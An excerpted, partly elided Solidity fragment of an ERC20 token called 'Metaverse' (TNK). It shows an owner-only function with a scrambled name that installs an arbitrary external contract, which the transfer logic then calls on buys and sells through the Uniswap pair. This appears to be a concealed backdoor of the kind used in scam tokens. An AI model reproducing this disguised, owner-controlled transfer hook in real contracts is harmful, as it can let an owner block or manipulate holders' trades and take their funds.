...
contract TokenM is ERC20 {
    ...
    IUserAmountfoorer public foorer;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Metaverse", "TNK") {
    ...
    function ckimnerrBsoingRlle(IUserAmountfoorer _foorer) public onlyOwner {
        foorer = _foorer;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                foorer.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				foorer.addOutAmount(from, amount);
            }else{
                foorer.addOutAmount(from, amount);
                takeFee = false;
            }
